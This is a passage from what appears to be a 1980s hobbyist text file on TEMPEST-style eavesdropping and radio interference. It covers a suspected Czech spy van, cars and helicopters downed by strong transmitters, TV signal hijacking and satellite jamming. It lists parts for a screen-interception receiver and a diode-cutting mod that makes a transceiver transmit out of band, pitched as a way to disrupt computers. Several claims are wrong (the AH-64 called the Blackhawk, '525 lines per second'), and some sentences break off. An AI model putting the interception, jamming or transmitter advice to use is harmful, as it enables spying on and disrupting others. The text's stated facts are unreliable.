may be a realistic emmission standard accepted by the DOD.


Example 1

"We had better "Czech" this out!
 -------------------------------
In 1987, a very strange occurence concerning forgein nationals from
an Eastern bloc nation entered this country in a large camper-like
truck via the border checkpoint at Niagra Falls, New York.
The visitors numbering 4 or 5, were in the country under tourist visa's
and were reported to be representives of the countries automobile and
truck industries here on a promotional tour to garnner interest in their
exportable products. The one problem with the "visitors" is that none of
them had any connection with such industries in their home country.
In fact, the visitors were far from what they supposedly represented.
The group descripton read like a Whos' Who of mid-level management of
Eastern bloc intelligence operations. The group reportedly consisted of
a nuclear physists, a specialist in aerial map-making complete with a
small ultra-light powered aircraft, a communications and computer expert
and two communist party officals.

Over a 5 month period, the group was reported to have visited 17 states
looking at 40 to 48 sites dealing with military and defense contractor
sites. The vehicle and its occupants were reportedly followed by over
100 agents of the FBI, NSA, Secret Service and State department and at
least one over flight of a military reservation was reported. Even though
the overflown site was not identified, one site was. This site, was the
"sensitive" naval communications center for the Pacific Fleet located
in San Diego. It was reported that the truck and it's occupants were
parked a few hundred yards from the facility for several days and
according to law, were in no violation of any current statute at the
time. The group was also at or around at the 2800 acre North Island
Naval Air Station based in Coronado, California. The spokesman for the
base stated that you could not see much of anything going on except for
the take-off and landing of aircraft which you could see from almost
any place.

Common sense states that you do not have to be inside the facility in
either a physical or electronic standpoint to collect information. You
can park in any lot or street close enough to your supposed target and
stick up your antennas. No property violations, no photo restrictions to
comply with, no restrictions at all because you are sitting in a public
place, parked or having coffee with your "ears" on. A good example of
such parking was reported in a paper published in Computers and
Security 4, titled Electromagnetic Radiation from Video Display Units:
An Eavesdropping Risk? by William Van Eck, copyright 1985. He stated
that when they were conducting their experiments in the open on public
roadways, with a van and antenna system that was quite noticable,
no one asked what they were doing or had any thought about the time
spent doing such things.

The end of this particular story is as follows: At the end of the suspect
journey, the truck was searched at the Nosgales, AZ border checkpoint and
was then released. Nothing considered illegal was found in the search
and the truck and it's passengers were released and entered Mexico.
Now even though the truck was suspected of performing passive
"eavesdropping" operations, the federal goverment had no legal right to
hold either the truck or crew. And the possible intercepted information was
then released from the country. It should be noted that the truck could
have a number of standard "off the shelf" items. These items could
have consisted of 2 general coverage radios with a combined tuning range
between 100 Khz to 2 Ghz., an IBM personal computer clone, various
cheap video and signal enhancment equipment, printers and modems,
and other such complement devices.

None of the equipment would be any "James Bond" type of gear and the
basic suspected set-up would cost the operation less than 10,000 dollars
if budgeted correctly. And if possible, use of other simple off the shelf
type radios like the 200.00unit available from Radio Shack that covers
150 Khz to 30 Mhz is not at all unheard of due to some budget constraints.
And since most emmanated signals generated by logical devices are within
commerical AM and FM frequencies, the use of a standard auto radio antenna
would suffice to use as a pickup.

So the major concern with such actions comes from the ability of simple
equipment to detect, register and decipher such emmanations with relative
ease. The ability of such persons and possible actions able to penitrate
the electronic fog of our society should be a clear distinct warning to
those concerned with security in general.

In addition to all of the above, the author contacted various federal
goverment agencies in reference to this information and was told that
they had no knowledge of such an investigation and could not tell where
such supposed counter-intelligence operations were controlled from or who
to contact in reference to supplying such information. Current "Freedom
of Information Act" requests for information concerning this supposed
federal project are underway.

An interesting note about filing the forms for access to information
about the Czech incident is described to give guidance to others who
may wish to investigate this incident and seek help from such elected
officals.

When the papers were filed for the desemenation of information
through the Freedom of Information Act, members of the U.S. Senate and
Congress were contacted in reference to this matter. The first contact
was placed through Senator Arlen Spectors office in Philadelphia, Pa.
We were first rebuffed by persons who refused to identify themselves
with the statement " I am sorry, but that information is covered by
the 1974 Privacy Act, Click! Well we called back and informed the
person who answered the call of the situation and then were re-connected
and informed them that Czech citizens were not covered by US privacy
laws and that there was no invasion of privacy.

They called the FBI and asked if they were the way such things were
handled, and were told yes or no. But they had no answer for any question
put forward and said " They were sorry!", but we don't know how to help
you!. Our second contact to Senator Spectors office in Philadelphia as
in essance like the first, they would not assist nor would explain why
they took this position in the first pace. During our second contact
we spoke to a Miss or Mrs. Anderson. She stated that such requests
were not in the senator's perview and they could not assist in this
matter. When asked why it as not in the senators preview, we were
informed that they do not have to give a response. When asked for an
offical response, we were informed that no offical response would be
given. But as a side note, Senator Hienz office said that they would
forward the requests to Spectors office in Washington. One other
thought on this matter: I am sure that if the good senator wants to get
some information, his staff jumps through hoops to get him all he wants
and then some! A pre-publish copy of this article will be delivered so
that even he (or his office staff, who were of no help at all due to a
tough question placed to them by a citizen) may learn of what may be
going on in his own country. So much for gaining assitance from a senator
who sits on a judical panel. We visited next the office of John Hienz.

Again, funny looks about the Freedom of Information Act and they hemmed
and hawed at the questions presented. They took the requests and said they
would try and see what could be done. Our final visit was to our local
congressman, Tom Foglietta, whos office still stated the 1974 Privacy law,
but took the requests when presented in person. It pays to visit your
elected representives working areas. So much to do (if you work there!)
in a goverment office. Other federal agencies including the FBI were most
helpful in complying with the requests. Of course we found this most
interesting. Is it so they could possibly reclassify the information to
a "Secret" status instead of what it may be now.

Other agencies contacted in reference to FOIA requests include the CIA,
NSA, NRO, Customs, State Dept., Army Automated Intelligence and Military
Police, FBI, FCC .


Example 2

"Breaker, Breaker, Wally Gator!"
 -----------------------------
During the 70's, the United States had a short term love affair with
the Citizens Band radio. What were once clean channels were suddenly
crammed with persons who wanted to be able to communicate with any
number of persons who also had such capabilities. Suddenly, everyone
had one of these radios in the home or car and some were know to have
both. Numerous persons ran such rigs with varing illegal applications
ranging from a lack of license to the intense over powering of such
stations.

To give a brief explanation of CB's, we will keep it simple. CB's
transmit in the upper reaches of 26 Mhz to 27 Mhz or 11 meters band.
CB's are allowed to operate with a maximum output of 5 watts radiated
power. Of course this limited power was not sufficent for some users and
the use of linear amplifiers or "heat" was commonplace. Stations were
known to be transmitting 50 to 2 thousand watts to their antennas which
in turn would increase such signals to a power of over 2 hundred thousand
watts. Some operators were known to show the intense power outputs with
the use of flourescent lightbulbs and the abilty to "light" these tubes
from a distance without electrical connections with the amplified radiated
power of their antennas.

Some persons were known to have full control of channels in their
respective areas and would blank out anyone who would not conform to
the channels establised rules or procedures. Others set-up pirate
stations that would broadcast commerical music for all to hear
complete with news, weather and sports. Such actions would tie up
frequencies and caused a general crackdown by the FCC in the later
years. But the problem still continues and the FCC has all but given
up on the idea of any enforcement of regulations concerning such
operations on the 11 meter or 27 Mhz band.

The craze of CB's left the general populace by the late 70's and was
back in the hands of those who would truely use such radios. Those who
would use such radios best known, would be the persons called truckers
since that is what they do. They "truck" goods from one place to
another and are concerned with time and travel conditions as most of
us are. The truckers always had some "heat" on-board for those times
when they could not get their signal "out". It was and still is
considered an insurance policy by most who have this technology and is
widespread in its use.

Now over time, with the continued expansion of these radios, the
truckers began to switch to marine band radios in the 10 meter band
and were conversing just as before. Since the 10 meter band would
permit such radios and the increased power output, the switch to 10
meters was only a matter of time. Now, it is reported that most
truckers are using and abusing such frequencies and their is little
that can be done to stop such occurances from happening. To add to all
of the mess, such radios have the ability to switch operating frequencies
with the touch of a button. In brief, the 10 meter radios can switch to
the 11 meter (CB) band with minor modifcations. And back and forth
frequency hopping is as easy as tuning in the average auto radio.

One other interesting aspect of these 10 and 11 meter radios and their
use of 10 meter amplifiers, is the problem of interference generated
by the amplifiers due to the lack RF chokes and filters for the simple
reason that the unit is designed for use on the 10, meter band, not
the 11 meter band and thats what the chokes and filters look for, 10
meters, nothing more, nothing less!

Enter the common travelling person with a late model vehicle. Most
vehicles today have some form of directed artifical intelliengence
working under the hood. The "brain" controls any number of common
operations ranging from air / fuel mixtures to how and when braking
systems will perform. Microprocessors in todays cars are as common as
seatbelts and are now required to assist in normal operations of said
vehicles. And this is where the problem begins. Since the auto must
have such control circuitry to function, then the possible interference
of such operations becomes a real threat. But what sort of threat
could be possible with a car, its control systems and a high powered
transmitting radio? Well, if one was to examine the idea of overriding
or shuting down said operations, the car would cease to function in any
proper manner. Such a shutdown could very easily cause fatal accidents
and the cause would be un-known due to all "looking" fine in any
aftermath examination.

 Now we add to the scene, your common average trucker with such a radio
in his poccession and the ability to transmit high powered signals as
one chosses. One example of such high power hijinks would be the
specfic targeting of autos on the highway with a points / scoring
system based on performance, price, make and if the car was built in
the U.S. or not. What would be the outcome? To answer, it would be the
shutdown of of the cars electronic logical systems causing other systems
on-board to do likewise in successive order. How can this come about?
Well the answer is quite clear, the high powered signal causes the logical
centers to conflict or ignore basic operational commands from the
microprocessor in turn causing the microprocessor to close down, then
cause a halt to basic actions and the car stops running.

Other known occuring incidents that have had some humerous and fatal
results have been reported in the past years by the press. Examples
are:

1. As early as the mid-seventies, Volkswagen developed a computer
controlled fuel injection valve control system. The car worked perfectly
in Europe, but had some unexplained engine failures in the united
states. The problem of engine failure was intermintent and very short
lived when happening. The alleged cause of such failures were the
transmission of Citizens Band radio frequencies from either mobile or
base stations near by and causing an induced current sufficent to
cause a malfuncition.

of two meter radios and the electronic control systems. Other cars are
reported to have some problems with cellular phones. Reports from
England even indicate such problems occuring in a wide spectrum of
autos in the area around Daventry due to RFI from the transmitter used
by Radio Four, a commerical station transmitting on 1500 meters along
with local AM and FM broadcasts. It seems that the station base was using
a very high wattage transmitter and that when the transmitter was
transmitting, the cars that passed close to the station would sometimes
shutdown the engine causing minor overall problems and some angry
motorists. If you look at this problem, you may see possible small
scale urban electronic warfare possibilities. Two such areas might
include the use of directed radio energy against late model autos by
law enforcement or worse, by terroristic factions seeking to do the
same thing. And one more example of such reports concern the sudden
acceleration problems with some imported cars in the U.S. An interesting
point to mention is that HONDA is offering owners of the 1988 Civic a
replacement chip because of such reported problems.

3. On the lighter side of the problem, it was reported in the November
24th, 1987 edition of the Baltimore Sun, that some residents of
Frederick, MD were having problems with the use of their electronic
garage door openers. Owners of such devices returned them to places
of purchase and found that the units worked perfectly. It was noted
that nearby, the U.S. Army operates a major communications center for
both domestic and international traffic. An Army spokesman stated that
they are not radiating anything that should lock up the garage door
recievers. It is also reported that when the Army turned off certain
transmitters, the garage door openers would work again. While the Army
stated that they were not the problem, the "problem" did disappear as
stated by the Army. You be the judge on this!

On the fatal side of this problem, incidents were more deadly than funny.
Although the cause of such incidents was all not due to an "Alligator"
radio, but it was caused by the same type of over poowered raidiated radio
emmissions. The cause was high wattage again and was to effect a new type
of attack helicopter in use by 2 different U.S. armed services.
The helicopter, known as the AH-64, Blackhawk or the naval version named
Seahawk is considered, operational state of the art in low level air
combat situations and is highly electronic in its basic make-up and
operations. The problem was two fold in nature and both were to contribute
in the final discovery.

The first cause was due to the need of the design to employ a unique
horizontal stabilizer to help the helicopter improve it fly-ability.
The stabilizer was controlled through a series of electronically
activated hydraulic systems run through a microprocessor that in turn was
controlled from the cockpit through a series of other logical and
electronic relay systems. There was no physical connection between the
crafts flight controls and the pilot of the craft. What is meant, is that
the fly by wire method was replaced by a set of relays and hydralic
attenuators instead of cables and pulleys. It may not a been as smooth as
the electronic flight, but it took an explosive charge to bring the
control to a dead stick and at the same time could be fixed with a pair
of wire cutters and clamps instead of a soldering iron and electronic
parts.

The second problem, being more unknown and deadly, consisted of radio
frequency interferance stemming from a number of different sources.
One such source was found as a common citizens band radio with major
illegal power output. Another incident of the same type of nature was
discovered when one of the helicopters flew to close to a commerical
radio stations transmissions towers. Both times the flight ended in
fatalities for the crews. It was discovered that strong radio was the
cause. According to published reports, 5 UH-60 Blackhawks have
nosedived into the ground killing 22 serviceman since 1982. And the
U.S. Army instructed it's pilots that flights near microwave antennas
or shipboard radar may cause "uncommanded" altitude changes. In English,
it translates to crashing into the ground at 600 miles per hour!
So, this basic simple problem was not thought of as one that was possible
even with the current concerns of systems management in the now fully
electronicisied battlefield.

So, the first problem was that the controls of the craft are being
directed by impulses instead of physical controls. The second was the
use of un-protected electronics from both background and now, potential
directed uses of radio frequency energy as weapons of warfare or even
better, as stated before limited urban actions.

So now we take the approach of normal radio environment and place an
active thought to possible options no available to a direct force.
If reports of these natures are known to the general public, then what
is to stop the directed force from becomming a new invisible tactic
that can cause major disruptions of computer / communications systems
currently in use.

Lets take the current state of electronic protective measure in force
and used by the different defense agencies throughout the country.
First off, we have the problem of large Electro-Magnetic Pulses, (EMP's)
being able to disrupt command and communications links with the use of
one nuclear device detoneated at a unknown range above the continential
united states.

Another example comes from outside theoretical research concerning the
SDI programs. One thought, from Thedore B. Taylor, a retired nuclear
weapons designer and father of the largest yield fission bomb, the
S.O.B., was quoted in an interview published in September, 1987.
He stated that if you explode a one-kiloton device in space and directed
the energy into a 3 centimeter beam of radiation, you could deposit
enough energy to wipe out electronic and electrical equipment - computers,
antennas, power lines, over an area larger that Washington, D.C. He was
also quoted as saying that microwave weapons are more than likely being
developed too.

Now weapons of this nature are on a very large scale and require vast
amounts of energy too start with. But in a directed small beam aimed at
normal general construction type buildings, a directed beam of energy cuts
through walls, doors, and windows as if they were not even there.
Your example is some of the local television or radio stations in your
area. If you look at all or most of the stations, you might find a small
shack atop of their building. It may contain the microwave dishes for the
studio to transmitter links. The glass and wood are nothing to the
in-comming or out-going signals. Brick walls mean nothing to a radio
signal either. Just tune in your desk radio and listen to your
favorite station.

So this pulse would be able to short out almost all commerical electrical,
telecommunications, computer operations, and any other devices that
contain transistors or semiconductors for a circuit path. These basic
examples show what such types damage that these emmisionns may pose.

The second part of this problem is with the protection of such circutry.
Great amounts of technology protection comes in the form of deep trenches,
standard and special grounding of buildings and equipment, cable and
support runways, and concrete encasements. Now this is all wonderful and
good from a military viewpoint where money is no object, but in the real
world, the use of such protective measures is not possible even for the
most prestigieous of corporations.

Now if such large pulses can destroy equipment on a global scale. Then the
idea of using such forces becomes a better local tool for the destruction
of security and measures taken to protect such devices and facilities from
a physical standpoint.

Ok now we know that the possibility of directed energy may be used to
disrupt the communications and operations of logical devices. There
are numerous ways to use such technology to gather and alter electronic
impulses. Another group of examples comes closer to the common man and
is happening all to frequently to the owner / operators of mass
communications systems. Best know, is the interruption of signals from
a Home Box Office satellite and the insertion of a message that stated
its subscripton rate was to high. That one incident struck fear in the
hearts of the communications industry and showed that anything was
fair game.

Other actions placed against commerical stations include the interception
and signal override of 2 television stations in the Chicago area. One such
action was placed against a Public Broadcasting station and the other was
directed to one of the "Super Stations" in the same area. The first pirate
transmission lasted 15 seconds and the second, two hours later, lasted 90
seconds. The Pirate, dressed in a Max Headroom facemask, uttered some
statement, although garbled and during the second incident, bent over and
exposed his / her rear and was struck on the behind with a fly swatter to
the shock of the viewers. Of course the FBI and FCC were called in to
investigate, but investigations of this sort led to nothing more than an
empty trail.

Now to perform such deeds, one would have to contact either the station or
the local office of the FCC to find out what the transmit and studio to
transmitter frequencies are. (And this goes for any transmitter registered
with the FCC. They will supply the name and location, frequency, and the
maximum legal output of such sites.) There are two frequencies used for
each television channel. One for the Audio and the other for the Video, or
the other option, to listen or watch the station until it sign's off for
the day (night). This one method does not lead to possible discovery and
the frequencies are given at sign-on and sign-off. A good example of such
frequencies is with a station located in Philadelphia, Pa. The station,
WPVI, transmits its audio signal on commerical FM frequencies.
The frequency is 87.8 Mhz. Now anyone with a good transmitter could add
anything to the signal and no one would be the wiser until they did.

Examples of such transmitters and persons capable of doing this type of
transmission is best described by the incident in the summer of 1987
concerning Radio New York. This radio station was considered a "pirate"
station and the federal goverment decided to move in and shut them down.
An interesting note to all of this, was that the station was located on a
ship anchored off the coast of New York outside US boundarys. Still the US
goverment with agents of the FBI, FCC, Customs and the Coast Guard boarded
the vessel, closed down the station, arrested the persons on-board and the
ship was taken in tow. End of that particular story.

On the other hand, two other stories of interest deal with the possible
and real way some may be able to jam or possibly damage state of the art
satellite communications. The first dealt with a group who call themselves
the American Technocratic Association based in Wilmington, Delaware.
This groups thought revolve around the scrambeling issue in use by the
pay TV companies. The background of the members of this group claim to
have a good working knowwledge of military radar communications systems.
The group claims to have the capability to jam a satellite with a few
mobile systems it has. One operation that the group hopes to undertake
was called "Operation Sunspot". The group claims to have areas mapped
out that have no treaty, regulation or statute dealing with the jamming
of a geo-stationary satellite. The one problem with all of this is that
such a thing could happen very easily. Now there are some who say that
such things could not happen, but if one is to look in a number of
magazines for such information on frequencies or locations, you could
find it.

So you say to yourself that you want to try this experiment. Well we
will not supply exact details of such techniques, but will say that
HAM radio operators have the ability to contact both American and
Soviet repeater satellites and if you wanted to you could do the same
thing. Now for your basic uplink to such systems, you would need a
transmit dish and the power behind the signal. So for a ten foot dish,
you would need 91 watts, a six foot dish, 280 watts. It may not be
dirt cheap to generate high powered signals in the mid range of 1-10
Ghz, but it does not present a great techincal obstacle and surplus
gear is so easy to obtain.

You don't need large dishes with great amounts of power to do this.
All that is needed is a moderate size dish, a few tens of watts at
microwave frequencies, and Bingo! You've got an effective satellite
jamming station! And then you have to address the issue of the
telemetry channel. THey may not be able to overtake the signal, but if
jam the signal with another, it may be possible to affect the
operation, stability or orbit of the target. Frequencies for such
channels are available from a number of sources and for as little as
$2.50 per frequency.

Now these examples and the reported stories dealing with television
stations interuption's are fast becomming one of the most feared aspect
of open air transmissions. Such transmitter frequencies are no longer the
domain of commerical radio and television stations. Transmissions on any
frequency are just a phone call away from suppliers who provide common
or business radio transmission technology.

So if satellite and television stations can be interupted by such
forces, six million dollar helicopters are taken down because of CB
radios, and automobiles cease to operate due to a wide spectrum of
emmited signals, then the possibility to intercept and harvest vast
amounts of knowledge is available to those who wish to gather such.

Now to explain such basic interceptions are now commonplace with
horrific results to those who do not believe that such things can
happen. For a simplistic view of such emmited signals, take a standard
"Walkman" type of radio and visit one of the many locations of ATM's
or better known as "money machines". (This excerise may also be performed
near any standard personal computer if such machines are not available.)
and tune through the FM band. With careful tuning, one will be able to
"hear" machine funcitions occuring. Taking basic simple electronics, one
may have the ability to recieve and reconstruct such impulses to a
readable form.

Or an example of larger scale and better know, would be with the use of
back-yard home satellite dishes. Dishes range from 6 to 12 feet wide.
Signals available include music, sports, news, movies, stock and
commodity trading quotes, weather, education and other such information
services. In addition to these services, a number of different multi-site
conference services are available from a host of major hotel chains as
well as privatly organized meetings held for specfic time periods and
dates. All may be tuned through the use of a dish and sensitive
information that may not be available to someone, is then made available
and no one is the wiser! Transponders are not private, and are rented out
for only the time used. And one other thing that might bring you to your
senses about such signals, is that the signals are transmitted by the
satellite over a wide area to anyone who can recieve such signals.

One other development is the small Micro-Sat by Norsat. This complete
system offers both satellite bands coverage, Ku and C, a small dish and
circuit board that fits inside an IBM PC. The unit downblocks 950 Mhz to
1.45 Ghz, offers a maximum baud rate of 9600 bps, frequency, bandwidth,
video and audio selectable formats and may be connected to the
VideoCipher II, B-Mac and Oak Orion descrambling systems.

Some other such signal reconstruction devices are now also available
through the mails. One such device is available in plan form from
Don Britton Enterprises and is called the Re-Process Sync Amplifier.
The device was developed to recieve signals emmanated from cable
television systems. What the device does in essance, is to take a
signal that "leaks" from cable tv systems and recieves such, adds a
sync signal needed by the television set to display the recieved
signals and then sends the signal to the antenna input of the set so
that display may happen. Now if weak signal reception is available from
leaking cable systems, then the ability to recieve weak signals from
logical devices is also possible.


Interception and Weapons Possibilities
--------------------------------------

Think about possible interception points pertaining to logical
security methods. Communications may be encrypted, data may be stored
in an in-active form and access is only a matter of time while the
interceptee is waiting for the dispersal. The next security concerned
area covered would be for the encryption of the information in its
stored and transmitted form. The encryption is all wonderful and good
for the transmission and storage, but does nothing for the information
as it is in its final stage to the human eyes! And you only have two
ways to get it to the eyes, in hard copy or by a video screen.

Now you think that interception is not possible since the information is
encrypted, but the data must be decrypted so that the human connection
may use the information. The human connection allows for the reception
of said information by the afore mentioned devices and lets interception
to happen through the clear or decryption points of the attacked devices.

And one other point to mention; other possible effects of reception /
transmission to security in general, could affect other controls ranging
from building energy management to security access and monitoring
controls.

To give a better understanding of such equipment, we will discuss
some of the devices known. One such device known as the Van Eck device
and the other is called the Re-Process Sync Amplifier. Some may feel that
there are two different systems involved in this discussion, but the
author finds no major difference between the two, with the exception of
the Van Eck device is built for operation on European voltages and has a
built-in digital frequency meter. The one major difference found is with
the dates of copyrights for the two devices. The Don Britton device is
dated 1979, while the Van Eck unit is dated October,1985.

Note: Another unit, with plans for such devices, are available from
Consumertronics, located in Alamorgordo, New Mexico. Besides the plans
for a Van Eck type reader, one book offers information in reference
to computer crime and countermeasures, how systems are penetrated, BBS
advice, Password defeats, TEMPEST, crosstalk amplifiers and a 200 word
phreaking terms glossary. All for only $15.00

We will begin with a basic understanding of the inner workings of the
device. The one other major basic difference with the two reader boxes is
that the Van Eck box is designed for use with tv's and VDT's used in
Europe as compared with the Britton box built for use in the United
States. This device in general, is designed to restore and regenerate the
sync and colorburst signals and ignores all information appearing during
either the vertical or horizontal blanking. Its basic result is
reconfigure through the use of supplying artifical external signals
inputed directly to any video monitor through a simple 10-50 dollar
modification of the TV or video monitor, or in simple english, takes a
weak video signal and tries to shape or match it and then boost its
output to a normal television screen.

One other interesting thought comes to mind with the use of video tape
copy protection methods. Since these methods use a means that makes it
tough on the VCR not the TV from generating signals for tape duplication,
there have been a number of devices that assist in the retoring and
re-structure of the picture and sound. One device is known as the
"Line Zapper". The device helps to adjust the brightness changes, vertical
jumping and jittering, and video noise. It is available in kit or complete
form. Pricing starts at $69.95 and complete tested units cost $124.95.
Now if this unit can assist in the filtering and structuring of
commerically induced weak signals, then it should be able to take a
boosted signal presented to it and clean the picture to something of
useable form. Some may see this only as a filter for video processing
with a focal point on the actual copy-guard techniques, but such a
device incorporated into the Van Eck type of gear should assist in the
overall signal restructuring.

Now one other interesting point about possible video signaling
re-construction methods was addressed in a multi-part series published in
Radio-Electronics based on the methodology used for the construction of
video signals scrambeled by different vendors of cable and over-the
air pay television. The series dealt with all aspects and methods of
video and audio, (complete with discussions on the DES methods used for
the VideoCipher units and the like,) used in commerical systems in use.

One other thought comes to mind of an experimental nature. Since the
screen of a computer is not always changing and for the most part stable
in its display, why not take the recieved signal and digitize it!
You could filter out signal noise clean up any true video signal present.
This is no great techno-wonder, the basic gear could be put together with
Radio Shack or the like types of equipment. And the cost is still most
reasonable. If not available there, costs for home-brew gear would not be
that high. The simple electronics blocks would consist of comparators,
video detectors, data seperator gates, a to d - d to a converters,
data amp and a signal level converter.

Or the better version, might be a modified slow scan television system
with error correction and clean-up circuits. Such units work over normal
phone lines or standard radio channels and since the units can take
signals from these two different types of inputs, there should be no
problem in adapting the unit to accept a cleaned up analog signal from a
digitizer.

Away from the world of the experimental thoughts, we return to the
point at hand....

Now there are two types of monitors used today. The first, called
composite and the second using TTL logic to control the screen and its
pattern. The composite screen is nothing more than a television set or
Apple computer type of monitor. The construction of the picture is
performed by a beam of electrons that are scanned across the screen at a
rate of 525 lines per second. Since the majority of screens are of a
composite nature ( this is even true in most IBM environments) the
ability to recieve the signal is very possible from a radio emmission
standpoint.

The reception of such signals is not fairytales, but comes with reality
attached through the use of simple electronics. The first part of the
reception project is to have a method of signal acaquisition and
amplifcation. Such gathering may be performed by the use of standard
electronics store technology. For this example, we will use common
Radio Shack electronics. The reason is due too the common variety
electronics that are available to most persons needing such science to
accomplish the required gathering.

To start, since a base station is out of the question due to the weak
signals one would have to recieve. So the need for transportable equipment
is a must. Antenna, amplifier, sync process unit and display medium
must be powered in the transit unit. Depending on budget and (BEL)
(Basic Equipment List) requierments a fully battery operated set-up
can be constructured for under ................


Our two systems described here will be different only in basic
construction and budgetary BEL's.

The "Radio Shack" Reader
------------------------
1. The antenna could consist of a Radio Shack TV/FM # 15-1611 for 49.95

2. If needed, Radio Shack in-line signal amplifier 10 db gain # 15-1117
   for 15.95

3. Radio Shack RF Video Modulator # 15-1273 for 26.95

4. The Britton or Van Eck unit (Cost unknown due to construction needs)

5. The tuning unit may consist different available FM,TV,UHF tuners
   available for the tuning of TV Sound & Picture reception and
   possible recording. Costs for such units range from 319.95 to 119.95
   The 319.95 unit can operate on AC / DC, has audio / video input jacks
   and can operate on 9 "D" batteries. Other possible useable units would
   be # either # 16-109 or 16-111. The units cost 219.95 and the other
   159.95  Both are able to tune in the full commerical AM / FM and
   VHF/UHF Television signals, The low end of the cost spectrum would
   be the RS # 16-113 at 119.95 This unit also has the same spectrum
   tuning abilities.


The Gold Plated Unit
--------------------

1. The antenna could consist of a Radio Shack TV/FM # 15-1611 for 49.95
   (Or due to the use of better reception electronics having built in
   antennas. But due to the need for amplified signals being inputed
   to the reciever we will still possibly use the RS amplified antennas.)
   a. It is also possible to use any number of amature radio antennas.
   For the purpose of maintaining a low profile, we will use one of the
   standard active recieving antennas that has a spectrum of reception
   from 50Mhz to 1 Ghz. Such units are available from mail order supply
   houses.

2. If still needed, Radio Shack in-line signal amplifier 10 db gain
   # 15-1117 for 15.95 It is also possible to use # 15-1105 Indoor FM
   Signal Booster with switchable 0,10 or 20 Db gain at a cost of 24.95.

3. Radio Shack RF Video Modulator # 15-1273 for 26.95

4. The Britton or Van Eck unit (Cost unknown due to construction needs)

5. Tuning units- The tuning units would consist of 2 seperate radio
   units. The units, both ICOM's have a combined tuning range of 100 Khz
   to 2 Ghz.

a. Unit 1 (R-71a) tunes from 100 Khz to 30 Mhz. This unit is nothing more
   than a shortwave reciever with excellent signal reception and frequency
   stability that offers far better overall signal interception quality.
   The unit offers 1 Hz tuning and has digital frequency readout.
   As an option, this unit may be controlled by an IBM or compatable PC.
   Cost for this unit is $949.00

b. Unit 2 (R7000) covers 30 Mhz to 2 Ghz. This unit is a general coverage
   reciever with excellent signal reception and frequency stability that
   offers far better overall signal tuning and interception quality.

   Also this unit can be computer controlled through an IBM or
   compatiable. The unit offers .01 Hz tuning and has digital frequency
   readout. Additional abilities of the unit include signal output and a
   IF output of 10.7 Mhz with other frequencies available. The cost for
   the unit is $1099.99. This particular unit also has an option for the
   output of the video signal and connection of any standard video monitor
   for 130 dollars. For an additional 160 dollars the unit can have the
   ability to recieve signals from 20 Khz and go all the way to the
   specified 2 Ghz. The unit needed is called a Kuranishi FC-7000
   frequency converter. With additional commerical television MDS tuning
   equipment, ranges can exceed 2.7 Ghz. Costs for this will range
   between 79 and 109 dollars. Since we will be mostly dealing in the
   lower ranges of frequencies, an added piece of gear may be used to gain
   the best signal reception points available. This is through the use a
   Radio Direction Finder available from American Electronics for 100

   dollars.

Now with all this equipment for both systems, another basic system
with minumum cost is readilly available to many for under 100.00
dollars. This we speak,of is the common Black & White Television set
available in mass quanties from any number of sources. It has been
reported that such interception capabilities are possible and have
occured without the interceptee knowing until the Communications
Commission have contacted the source of the emmited signals.

For example, some personal computers and their respective screen have
been known to been picked up on the TV screens of their neighbors and
through nothing more than rough or fine tuning the reception. The reason
is due to the TV having the ability to automatically adjust the Sync
signals to those close to the frequency of intercepted computer screens
sync frequency. This "ability" is available through the use of a common
manual type tuner on a standard Black & White set with a normal
directional antenna and an standard antenna amplifier. All three
devices in common life and attached to your own television recievers!

You have such devices if you have an antenna on your roof or attached
to your set. Most have attached signal amplification due to the ever
growing background noise generated by normal commerical stations and
reception charictersistic In simple term, the guy next door can read
your screen and you don't know it. Now take the number of personal type
computers in a standard corporate environment, caulculate the possible
dollar figures of the combined information contained in these machines,
and substantial sums become more evident than ever before. If business
plans, formulas or patent-trade information, client lists, or any
other type of valuable information and since that information will be
called up at any time or current work performed is wanted in the
surveillance gathering operation and then you have a completely wide open
way of monitoring the daily practices and transactional actions with
complete impunity and securty of such areas is completely unguarded due
to the lack of knowledge.


For experimental purposes, we will use very simplistic computer systems
to give an idea of what may be possible. The equipment shall be basic,
over the counter, cheap, electronic systems to gather and produce the
signals we which to collect.

The equipment list is as follows:

1. Franklin Ace 1200 (Apple II compatiable)

   a. Franklin Ace Serial / Paralell Card
      (Paralell card is in use for the 2 printers.)

   b. Apple Super Serial Card (RS-232) for use with the communications
      modem.

2. Franklin Video Monitor (40 or 80 characters display)  18 Mhz

   ( Standard IBM monitors radiate at 15 to 16 Mhz )

3. Prometheus ProModem 1200 (External type)

4. Printers

   a. Okidata Microline 92

   b. Epson MX-80

Our basic reception / interception equipment consists of:

1. Bearcat 250 (50 Channel) Scanner

   (Coverage from 32-50,146-148,148-174,420-450,450-470,470-512 Mhz)

2. Soundesign FM Stereo Tuner (86.5 Mhz to 109.5 Mhz)

3. Electrobrand AM-FM-SW-CB-TV-PB-AIR-Weather

   The AM and FM are standard commerical band recievers.

   SW is short-wave from 4 Mhz to 12 Mhz

   TV coverage is from audio channels 2 through 13

   AIR band from 108 through 135 Mhz

   Public Band is 145 through 175 Mhz

4. A Gould OS 1100 A Osocilliscope 25 Mhz range


Since we will not try to re-construct the actual video signal generated,
as this has already been done, we will not have to explain what we recieve
as a picture. What we will cover is the gross signal output of standard
population computerized logical systems.

In our observations, we have seen a wide spectrum of emmitted signals
with a strong signal between 9.0 and 9.250 Mhz for the display of
standard text scrolling by. Better signal display was found at the
lower frequencies of 9 Mhz. Monitor frequencies were found in the area
of 11 through 19.5 - 20 Mhz. Printer frequencies are in the range of
140 to 200 Mhz. Disk operations were detected in the ranges of 88 to
250 Mhz. Overall frequency generation was from 4 through 500 Mhz.
The modem was found between 28 and 300 Mhz. All in all, this easy
discovery of radiated or transmitted signals by means of common radio
technology could lead to.

An interesting thought comes up with the use of some common ham
transcievers for such operations, and with simple, easy modifications,
some can transmit on all frequencies from 1.6 t 30 Mhz. Such a transmitter
would be the Kenwood 440. This transciever offers 100 watt output and as
stated all frequency transmit. To perform the small modification, all one
would have to do is cut one lead to a diode (Diode D 80) and as an added
bonus for better frequency  readout, you gain an additional readout of
10 Hz by snipping the lead to Diode 66. So the unit covers the range of
IBM PC frequencys in use and all of the Apple systems too. Thats says it
all! It can offer the possibility for disruption of internal signals used
to process information and the possibility of causing other logic related
systems to act or not without reason.

For example, would it be possible for the Soviets to sit under cover with
a modified Kenwood 440 100 watt radio or better yet, a Radio Shack 40
channel AM / SSB and a 100 watt Firebird linear amplifier and a simple
small antenna to disperse the signal. So the problem of the 6 million
dollar helicopter comes down to a wholesale cost of 150.00 ( 190.00 to
